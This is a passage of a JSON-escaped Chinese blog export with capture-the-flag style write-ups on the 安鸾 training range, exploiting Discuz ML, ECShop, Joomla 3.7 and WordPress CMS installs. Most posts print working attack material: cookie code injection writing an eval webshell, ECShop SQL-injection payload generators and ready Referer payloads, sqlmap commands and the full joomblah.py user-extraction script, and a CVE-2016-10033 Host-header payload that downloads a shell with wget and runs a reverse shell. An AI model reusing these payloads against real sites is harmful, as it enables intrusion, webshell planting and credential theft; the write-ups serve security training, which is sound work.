false;&#125;\n\n\n/var/www/html/ThinkPHP/Library/Think/View.class.php 注释第 110 行，写入 if(!is_file($templateFile)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;));\n\n\n\n0x06 修复测试/var/www/html/data/Runtime/Logs/Home/22_02_19.log 清除日志文件，重复 0x04。可以实现第 2 步，到第 3 步就无法实现报错了，故隔绝了远程文件读取漏洞的实现。\n0x07 后记\n最开始，看其他师傅的 CNVD-2017-26183 复现，懵，领悟不出来中间，利用 CNVD-2017-26183 getshell，逛了下，发现确实有师傅利用任意文件拿 flag最后，信息收集到了，并写下了这篇笔记感谢，留下信号的师傅；感谢，留下 poc 的师傅，感谢，坚持的我\n\n","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾CMS系列之Discuz","url":"/article/b160ab77.html","content":"前言本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。\t–涂寐\n正文步骤说明题目URL：http://whalwl.site:8042/forum.phptips：flag在网站根目录下Answer：  1、思考一下，既然是练CMS，那就找下Discuz系列的漏洞，根据版本号（Discuz! X3.2）更加精确的查找。  2、根据一些百度漏洞报告试验，最后锁定《Discuz!ML 3.x任意代码执行漏洞》；根据该名称再次搜索漏洞报告，尝试复现拿flag。  3、访问站点，通过bp抓包并发送到Repeater模块，在Cookie的language字段值后面拼接php代码来检验该漏洞的存在:如yGa2_2132_language=sc&#x27;.phpinfo().&#x27;;；确认站点存在任意代码执行漏洞（拼接时sc可不写）。  4、拼接的代码改为 &#x27;.file_put_contents(&quot;tumei.php&quot;,urldecode(&quot;&lt;?php eval($_POST[tumei]) ?&gt;&quot;)).&#x27; 进行一句话木马上传。  5、注：数据包请求后，会将该代码全部转小写，同时进行一次URL解码和再次编码（不会将POST编码），解码时（在执行命令时，命令中的全部URL编码将被解开），故需要将POST进行二次编码，第二层编码通过urldecode()函数解开，使命令中正常显示POST字样。  6、当一句话木马中的POST字符为小写时，请求方式不对，一句话木马将无法被执行，无法成功连接。因此最终的代码（将对　POST　编码一次，整个一句话木马再编码一次），得到： &#x27;.file_put_contents(&quot;tumei12.php&quot;,urldecode(&quot;&lt;%3fphp+eval($%255f%2550%254f%2553%2554[&#x27;tumei&#x27;])%3b%3f&gt;&quot;)).&#x27; 。  7、通过 &#x27;.system(&#x27;ls&#x27;).&#x27; 可知，http://whalwl.site:8042/forum.php中的forum.php在网站根目录下，故直接用菜刀、蚁剑等工具（注：专用马需相应工具）连接http://whalwl.site:8042/tumei.php即可获取网站根目录下的flag。  8、不想麻烦的，可通过language变量名构造 &#x27;.system(&quot;ls&quot;).&#x27; 查看目录内容后，直接利用 &#x27;.system(&quot;cat flag_a29d1598024f9e87beab4b98411d48ce&quot;).&#x27; 直接显示flag。  9、最终拿到flag&#123;49c883689da71363809d64b8b48679ba&#125;\n图片步骤\n语法普及语法普及：\t①phpinfo()：查看php的版本等配置的详细信息;    ②file_put_contents(filename,data)：PHP语法，把data写入finename文件中。    ③Linux语法：\t\tifconfig\t\t\t\t\t#显示或配置网络设备    \tsystem(&#x27;ls&#x27;)\t\t\t\t#调用shell来执行ls命令        whoami\t\t\t\t\t\t#显示当前操作用户        pwd\t\t\t\t\t\t\t#显示当前目录路径。        ls\t\t\t\t\t\t\t#显当前目录下的文件与目录。        ../\t\t\t\t\t\t\t#上级目录。        cd ../\t\t\t\t\t\t#从当前目录切换到上级目录。        cat /etc/passwd &gt; pass.txt\t#显示/etc/passwd中的内容到pass.txt来获取系统账号，类似复制。        tar -cvf cf.tar config\t\t#打包配置文件config到cf.tar。","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾CMS系列之Ecshop","url":"/article/6c219c57.html","content":"前言本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。\t–涂寐\n正文步骤说明题目URL：http://www.whalwl.site:8030tips：flag在服务器根目录下，文件名为this_is_flagAnswer：\t1、界面信息收集：①ECShop v3.6.0 ②Apache 2.4.25 ③PHP 5.6.37 ④Debian ⑤可以登录注册\t2、老规矩，先来一波目录扫描，找到个管理中心，试了试，没法玩的。直接百度，找ecshop的通用漏洞。  一查即到：ecshop 全系列版本网站漏洞 远程代码执行sql注入漏洞漏洞来源：网站根目录下的user.php代码，在调用远程函数的同时display赋值的地方可以直接插入恶意的sql注入语句，导致可以查询mysql数据库里的内容并写入数据到网站配置文件当中，或者可以让数据库远程下载文件到网站目录当中去。\t3、方法一：利用脚本生成POC，在/user.php添加Referer参数，参数内容为poc。\t4、方法二:直接利用工具getshell，写入ecshop站URL，自动getshell。\t5、喜提一枚flag：flag&#123;25efa6ff2d103322f3c675cde6d58361&#125;\n图片步骤\nPOC生成脚本生成写入phpinfo()的Paylaod\n&lt;?php$shell = bin2hex(&quot;&#123;\\$asd&#x27;];phpinfo\\t();//&#125;xxx&quot;);$id = &quot;-1&#x27; UNION/*&quot;;$arr = [    &quot;num&quot; =&gt; sprintf(&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;, bin2hex($id), $shell),    &quot;id&quot; =&gt; $id];$s = serialize($arr);$hash3 = &#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;;$hash2 = &#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;;echo &quot;POC for ECShop 2.x: \\n&quot;;echo &quot;Referer: &#123;$hash2&#125;ads|&#123;$s&#125;&#123;$hash2&#125;&quot;;echo &quot;\\n\\nPOC for ECShop 3.x: \\n&quot;;echo &quot;Referer: &#123;$hash3&#125;ads|&#123;$s&#125;&#123;$hash3&#125;\\n&quot;;?&gt;\n生成写入webshell的Paylaod\n&lt;?php$shell = bin2hex(&quot;&#123;\\$asd&#x27;];assert\\t(base64_decode(&#x27;ZmlsZV9wdXRfY29udGVudHMoJ3R1bWVpLnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUW3R1bWVpXSk7Pz4nKQ==&#x27;));//&#125;xxx&quot;);$id = &quot;-1&#x27; UNION/*&quot;;$arr = [    &quot;num&quot; =&gt; sprintf(&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;, bin2hex($id), $shell),    &quot;id&quot; =&gt; $id];$s = serialize($arr);$hash3 = &#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;;$hash2 = &#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;;echo &quot;POC for ECShop 2.x: \\n&quot;;echo &quot;Referer: &#123;$hash2&#125;ads|&#123;$s&#125;&#123;$hash2&#125;&quot;;echo &quot;\\n\\nPOC for ECShop 3.x: \\n&quot;;echo &quot;Referer: &#123;$hash3&#125;ads|&#123;$s&#125;&#123;$hash3&#125;\\n&quot;;?&gt;\n直接使用EXPphpinfo()：\nPOC for ECShop 2.x: Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94caPOC for ECShop 3.x: Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a\nwebshell（tumei.php&#x2F;tumei）\nPOC for ECShop 2.x: Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:315:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b61737365727409286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a335231625756704c6e426f634363734a7a772f63476877494756325957776f4a4639535256465652564e55573352316257567058536b37507a346e4b513d3d2729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94caPOC for ECShop 3.x: Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:315:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b61737365727409286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a335231625756704c6e426f634363734a7a772f63476877494756325957776f4a4639535256465652564e55573352316257567058536b37507a346e4b513d3d2729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a\n自动getshell工具https://codeload.github.com/Hzllaga/EcShop_RCE_Scanner/zip/refs/heads/master","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾CMS系列之Joomla","url":"/article/51e9a7e.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io/article/51e9a7e.html\n\n0x01 题目提示题目URL：http://106.15.50.112:8039/提示：flag在服务器系统根目录，文件名为flag\n0x02 信息收集\n简单浏览站点 + 目录扫描 + 插件检测，得到：\n\n①PHP:5.6.40 ②nginx&#x2F;1.14.2 ③Joomla! 3.7 ④Linux\n\nCMSeek 扫描一波，信息还不错\n\n\n\n度娘找 Nday，可以看下官方公告什么时候缩小范围发布时间 : 2019/11/26题目类型 : CMS系列题目名称 : Joomla\n\n\n0x03 joomscan 利用\n直接给它扫一轮看有点啥， joomscan -u http://106.15.50.112:8039/ ，路径挺多的\n\n\n\n该干正事了，咱找的是 joomla 3.7.0 的可能漏洞， searchsploit joomla 3.7.0\n\n\n\n分别看下文档呗 searchsploit -m 42033 ，分别的漏洞编号，CVE-2017-8917 和 CVE-2018-5263，比对度娘所得，判断为 CVE-2017-8917 拿 flag\n\n\n0x04 SQLMap 利用\n根据 joomscan 中文档提示，枚举所有数据库名，SQLMap 中写入 ：\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n\n\n这一长串的，懵吗？你说呢！解析下\n#sqlmap爆破数据#sqlmap使用到的一些参数--random-agent\t\t\t\t# 随机user-agent--level=LEVEL\t\t\t\t\t# 测试的等级（1-5，默认为1）--risk=RISK\t\t\t\t\t\t# 测试的风险等级（1-4，默认1）--dbs\t\t\t\t\t\t\t\t\t# 枚举数据库-D joomladb \t\t\t\t\t# 指定枚举的 joomladb 数据库--tables    \t\t\t\t\t# 枚举数据库中的表-T &quot;#_users&quot;         \t# 指定枚举的表&quot;#_users&quot;--columns  \t\t\t\t\t\t# 枚举表中的字段(列)-C username,password \t# 指定从 usrname 和 password 列查询数据--dump        \t\t\t\t# 获取信息，下载数据-p name\t\t\t\t\t\t\t\t# 多参数是，指定对 name 参数进行注入-u\t\t\t\t\t\t\t\t\t\t# 指定攻击目标，需带参数\n\n枚举 joomla 数据库下所有表：\n\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]\n\n\n有个 user 表，肯定得爆一波字段\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &quot;#_users&quot; --columns -p list[fullordering]\n\n\n继续，拿账密：\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &quot;#__users&quot;  -C username,password --dump -p list[fullordering]\n\n\n尝试解密\n\n这加密？BCrypt 加密算法，以前年轻，找了一个又一个字典，皆是无功而返，现在就不演示了。想玩的，慢慢碰撞吧，我先走一步……​ admin    | $2y$10$hDW1g7/LAsdnB6y34ClFH.QYWgDeBMEeboHngKL.DVCcZb8IJ4gYO \n\n直接读取服务端本地文件 ‘&#x2F;flag’ – flag{89947d410d897474}\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agen -p list[fullordering] --file-read &#x27;/flag&#x27; \n\n\n尝试写入 SHELL 文件，结果大致是没权限吧\n\nsqlmap -u &quot;http://106.15.50.112:8039/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agen -p list[fullordering] –file-write ./test.txt –file-dest ./1.txt \n\n0x05 手工读取服务端文件\n读取 &#x2F;flag\n\n根据题目提示，可知 flag 在网站根目录，故其路径为 /flag ，注：此处 /flag 需转为十六进制避免报错。在mysql中，load_file()函数读取一个文件并将其内容作为字符串返回，如下我们就需要利用报错注入+ load_file 函数实现对服务端文件的非法读取： http://106.15.50.112:8039/index.php?option=com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x7e,load_file(0x2f666c6167),0x7e),1)\n\n读取 &#x2F;etc&#x2F;passwd\n\nhttp://106.15.50.112:8039/index.php?option=com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x7e,load_file(0x2f6574632f706173737764),0x7e),1)\n0x06 脚本爆账密直接写入 python2 joomblah.py http://106.15.50.112:8039 ，得到一个账号和加盐的口令。这是大佬的脚本链接：https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py\n#!/usr/bin/pythonfrom __future__ import print_functionimport requestsimport sysimport reimport argparseimport osimport randomimport timeimport binasciidef extract_token(resp):\tmatch = re.search(r&#x27;name=&quot;([a-f0-9]&#123;32&#125;)&quot; value=&quot;1&quot;&#x27;, resp.text, re.S)\tif match is None:\t\tprint(&quot; [!] Cannot find CSRF token&quot;)\t\treturn None\treturn match.group(1)def parse_options():\tparser = argparse.ArgumentParser(description=&#x27;Jooma Exploit&#x27;)\tparser.add_argument(&#x27;url&#x27;, help=&#x27;Base URL for Joomla site&#x27;)\treturn parser.parse_args()def build_sqli(colname, morequery):\treturn &quot;(SELECT &quot; + colname + &quot; &quot; + morequery + &quot;)&quot;def joomla_370_sqli_extract(options, sess, token, colname, morequery):\tsqli = build_sqli(&quot;LENGTH(&quot;+colname+&quot;)&quot;, morequery)\tlength = joomla_370_sqli(options, sess, token, sqli)\tif not length:\t\treturn None\tlength = int(length)\tmaxbytes = 30\toffset = 0\tresult = &#x27;&#x27;\twhile length &gt; offset:\t\tsqli = build_sqli(&quot;HEX(MID(%s,%d,%d))&quot; % (colname, offset + 1, 16), morequery)\t\tvalue = joomla_370_sqli(options, sess, token, sqli)\t\tif not value:\t\t\tprint(&quot; [!] Failed to retrieve string for query:&quot;, sqli)\t\t\treturn None\t\tvalue = binascii.unhexlify(value)\t\tresult += value\t\toffset += len(value)\treturn resultdef joomla_370_sqli(options, sess, token, sqli):\tsqli_full = &quot;UpdateXML(2, concat(0x3a,&quot; + sqli + &quot;, 0x3a), 1)&quot;\tdata = &#123;\t\t&#x27;option&#x27;: &#x27;com_fields&#x27;,\t\t&#x27;view&#x27;: &#x27;fields&#x27;,\t\t&#x27;layout&#x27;: &#x27;modal&#x27;,\t\t&#x27;list[fullordering]&#x27;: sqli_full,\t\ttoken: &#x27;1&#x27;,\t&#125;\tresp = sess.get(options.url + &quot;/index.php?option=com_fields&amp;view=fields&amp;layout=modal&quot;, params=data, allow_redirects=False)\tmatch = re.search(r&#x27;XPATH syntax error:\\s*&amp;#039;([^$\\n]+)\\s*&amp;#039;\\s*&lt;/bl&#x27;, resp.text, re.S)\tif match:\t\tmatch = match.group(1).strip()\t\tif match[0] != &#x27;:&#x27; and match[-1] != &#x27;:&#x27;:\t\t\treturn None\t\treturn match[1:-1]def extract_joomla_tables(options, sess, token):\ttables = list()\tfirst = False\toffset = 0\twhile True:\t\tresult = joomla_370_sqli_extract(options, sess, token, &quot;TABLE_NAME&quot;, &quot;FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT &quot; + str(offset) + &quot;,1&quot; )\t\tif result is None:\t\t\tif first:\t\t\t\tprint(&quot;!] Failed to retrieve first table name!&quot;)\t\t\t\treturn False\t\t\tbreak\t\ttables.append(result)\t\tprint(&quot;  -  Found table:&quot;, result)\t\tfirst = False\t\toffset += 1\treturn tablesdef extract_joomla_users(options, sess, token, table_name):\tusers = list()\toffset = 0\tfirst = False\tprint(&quot;  -  Extracting users from&quot;, table_name)\twhile True:\t\tresult = joomla_370_sqli_extract(options, sess, token, &quot;CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)&quot;, &quot;FROM %s ORDER BY registerDate ASC LIMIT %d,1&quot; % (table_name, offset) )\t\t\t\tif result is None:\t\t\tif first:\t\t\t\tprint(&quot;!] Failed to retrieve user from table!&quot;)\t\t\t\treturn False\t\t\tbreak\t\tresult = result.split(&#x27;|&#x27;)\t\tprint(&quot; [$] Found user&quot;,result)\t\tfirst = False\t\toffset += 1\t\tusers.append(result)\treturn usersdef extract_joomla_sessions(options, sess, token, table_name):\tsessions = list()\toffset = 0\tfirst = False\tprint(&quot;  -  Extracting sessions from&quot;, table_name)\twhile True:\t\tresult = joomla_370_sqli_extract(options, sess, token, &quot;CONCAT(userid,0x7c,session_id,0x7c,username)&quot;, &quot;FROM %s WHERE guest = 0 LIMIT %d,1&quot; % (table_name, offset) )\t\t\t\tif result is None:\t\t\tif first:\t\t\t\tprint(&quot;!] Failed to retrieve session from table!&quot;)\t\t\t\treturn False\t\t\tbreak\t\tresult = result.split(&#x27;|&#x27;)\t\tprint(&quot; [$] Found session&quot;, result)\t\tfirst = False\t\toffset += 1\t\tsessions.append(result)\treturn sessionsdef pwn_joomla_again(options):\tsess = requests.Session()\tprint(&quot; [-] Fetching CSRF token&quot;)\tresp = sess.get(options.url + &quot;/index.php/component/users/?view=login&quot;)\t\ttoken = extract_token(resp)\tif not token:\t\treturn False\t# Verify that we can perform SQLi\tprint(&quot; [-] Testing SQLi&quot;)\t\tresult = joomla_370_sqli(options, sess, token, &quot;128+127&quot;)\t\tif result != &quot;255&quot;:\t\tprint(&quot; [!] Could not find SQLi output!&quot;)\t\treturn False\ttables = extract_joomla_tables(options, sess, token)\tfor table_name in tables:\t\ttable_prefix = table_name[:-5]\t\textract_joomla_users(options, sess, token, table_name)\t\textract_joomla_sessions(options, sess, token, table_prefix + &#x27;session&#x27;)\treturn Truedef print_logo():\tclear = &quot;\\x1b[0m&quot;\tcolors = [31, 32, 33, 34, 35, 36]\tlogo = &quot;&quot;&quot;                                                                                                                        .---.    .-&#x27;&#x27;&#x27;-.        .-&#x27;&#x27;&#x27;-.                                                               |   |   &#x27;   _    \\     &#x27;   _    \\                            .---.                            &#x27;---&#x27; /   /` &#x27;.   \\  /   /` &#x27;.   \\  __  __   ___   /|        |   |            .               .---..   |     \\  &#x27; .   |     \\  &#x27; |  |/  `.&#x27;   `. ||        |   |          .&#x27;|               |   ||   &#x27;      |  &#x27;|   &#x27;      |  &#x27;|   .-.  .-.   &#x27;||        |   |         &lt;  |               |   |\\    \\     / / \\    \\     / / |  |  |  |  |  |||  __    |   |    __    | |               |   | `.   ` ..&#x27; /   `.   ` ..&#x27; /  |  |  |  |  |  |||/&#x27;__ &#x27;. |   | .:--.&#x27;.  | | .&#x27;&#x27;&#x27;-.        |   |    &#x27;-...-&#x27;`       &#x27;-...-&#x27;`   |  |  |  |  |  ||:/`  &#x27;. &#x27;|   |/ |   \\ | | |/.&#x27;&#x27;&#x27;. \\       |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |       |   |                              |__|  |__|  |__|||\\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |    __.&#x27;   &#x27;                                              |/\\&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   |      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \\ \\._,\\ &#x27;/| &#x27;.    | &#x27;.  |____.&#x27;                                                                `--&#x27;  `&quot; &#x27;---&#x27;   &#x27;---&#x27; &quot;&quot;&quot;\tfor line in logo.split(&quot;\\n&quot;):\t\tsys.stdout.write(&quot;\\x1b[1;%dm%s%s\\n&quot; % (random.choice(colors), line, clear))\t\t#time.sleep(0.05)def main(base_url):\t\toptions = parse_options()\toptions.url = options.url.rstrip(&#x27;/&#x27;)\tprint_logo()\tpwn_joomla_again(options)if __name__ == &quot;__main__&quot;:\tsys.exit(main(&quot;http://192.168.10.100:8080/joomla&quot;))\n\n0x07 后记\n说什么呢，这个题目纠结了很久，就搁解密那儿，就硬怼现在只想说一句，先自己想，可以跟别人的思路，但也别走死胡同这玩意时拿 flag 呀，看题目提示！好吧~又菜又爱玩\n\n","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾CMS系列之Wordpress01","url":"/article/7fc5ff55.html","content":"前言\n本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。\t–涂寐\n\n正文步骤说明题目URL：http://whalwl.site:8041/Answer：\t1、信息收集：①WordPress/4.6②PHP 5.5.9③Ubuntu④MySQL⑤Apache 2.4.7。\t2、好吧，扫了一波目录还是没有什么什么好玩的，找度娘玩吧。\t3、锁定目标CVE-2016-10033，具体解析自己找度娘。\t4、wordpress4.6密码重置界面抓包，账号admin（建议WPscan枚举下存在的用户：wpscan --url 127.0.0.1 --enumerate u），修改host头，具体见3.3POC，go一下，蚁剑连一下。\t5、通过反弹shell，在自己的服务器上进行命令执行。具体看图片步骤。\t5、恭喜，服务器根目录下的这个flag是你的了：flag&#123;277c6034e076a900cbd971a517a5bca7&#125;tops:\t1、远程 URL 中不要有 http://\t2、所有字母必须小写\t3、所有 / 用 $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125; 代替\t4、所有 空格 用 $&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125; 代替\t5、留个思路，找个在线文本替换内容，可以github作为服务器\n图片步骤\n一句话shell拿公开shell来上传，发现不行，那就自己搭服务器来getshellHost处原文：&#x2F;usr&#x2F;bin&#x2F;wget –output-document &#x2F;var&#x2F;www&#x2F;html&#x2F;tumei.php 127.0.0.1&#x2F;shell.txt\nPOST /wp-login.php?action=lostpassword HTTP/1.1Host: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tumei.php$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;127.0.0.1$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;shell.txt&#125;&#125; null)Content-Length: 56Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://whalwl.site:8041Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.30Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://whalwl.site:8041/wp-login.php?action=lostpasswordAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: wordpress_test_cookie=WP+Cookie+checkConnection: closeuser_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password\n反弹shell自己改host\n#下载bash脚本到目标#原文：/usr/bin/wget --output-document /tmp/tumei 127.0.0.1/rce.txtHost: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tumei$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;127.0.0.1$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce.txt&#125;&#125; null)#执行#原文：/bin/bash /tmp/tumeiHost: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bash$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tumei&#125;&#125; null)","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾CMS系列之Wordpress02","url":"/article/52122537.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io/article/52122537.html\n\n0x01 看一波题目URL：http://106.15.50.112:8043/\n0x02 信息收集\n指纹识别，该先浏览一波网站的\n\n度娘找到相关 Nday，针对 WordPress 4.9.8 拿 WPScan 扫用户名，得到 author 和 admin。author 无效，拿 admin 爆破到天荒地老……\n\n近日，问了下春天师傅：方法对，但还有账户……我……立即翻下登录页，果真对账户的正确性给与了提示……\n\n\n0x03 BP在爆破\n直接一波常用 username，啧啧啧……小东西，还有个 test 账户。\n\n\n\n账户有了，那就继续密码呗！抽个幸运字典，恭喜你获得一枚密码 1qaz2wsx\n\n\n0x04 图片上的马儿\n对图片的 EXIF 数据进行 shell 插入：exiftool text1.jpg  -documentname=&quot;&lt;?php echo exec(\\$_POST[&#39;cmd&#39;]);?&gt;&quot; \n在某次测试时，进行到命令执行部分发现返回包中含有 gd-jpeg v1.0 ，因此判断该 WordPress 是使用 PHP-GD库处理图片。翻找国内外，以我的收集能力就找到大佬的  jpg_payload.php 脚本：php jpg_payload.php text1.jpg \n很可惜，测试了几天，愣是一次也没得，期间还比对了 MSF 中相应的漏洞利用脚本。昨晚搞到三点，不甘心，问了官方的师傅，说会做个视频讲解，等待吧……先暂且把笔记给留下\n\n\n0x05 WordPress 5.0 RCE\n做好前期准备了，那就登录吧。  http://106.15.50.112:8043/wp-admin/upload.php 处上传图片 dufu.jpg\n\n\n\n访问 http://106.15.50.112:8043/wp-admin/post.php?post=379&action=edit ，post 值需要成你图片的，更新图片时抓包（包一），并发送至重放模块待用。\n\n\n\n刚看到 Edit Image 没，点击它就到当前界面了。剪裁图片，保存时抓包（包二），并发送至重放模块待用\n\n\n\n方法一：目录穿越\n\n①仅在包一中添加 &amp;post_author_override=1&amp;meta_input[_wp_attached_file]=2022/02/dufu.jpg#/22.jpg ，并重放包二。②在包一末尾改添加： &amp;meta_input[_wp_attached_file]=2022/02/dufu.jpg#/../../../../themes/twentynineteen/22.jpg ，并重放包二。③通过一些手段，可以看到确实是能够目录穿越，在 ../themes/twentynineteen 目录成功写入图片，检查且木马仍旧存在。\n\n方法一：命令执行\n\n重复抓取包二的操作，此次改上传为文本文件 test.txt ，依旧发送至重放模块，末尾写入 &amp;meta_input[_wp_page_template]=22-e1644857781657.jpg，访问 http://106.15.50.112:8043/test ，噔噔，界面不存在。\n\n方法二：目录穿越\n\n①对包二的 post 值部分进行替换： action=crop-image&amp;_ajax_nonce=ef827c133f&amp;postid=379&amp;history=%5B%7B%22c%22%3A%7B%22x%22%3A11%2C%22y%22%3A10%2C%22w%22%3A376%2C%22h%22%3A245%7D%7D%5D&amp;target=all&amp;context=&amp;do=save&amp;id=379&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100 。建议直接复制这里的 payload ，仅需修改 _ajax_nonce 、 postid 和 id 参数。②接下来操作如同 方法一：目录穿越。③经检测，cropped-22.jpg 成功写入，但一句话却被干掉了。\n\n方法二：命令执行\n\n见有的师傅是新建一个帖子草稿（最接近 MSF 脚本的），试试，，仍是找不到界面。\n0x06 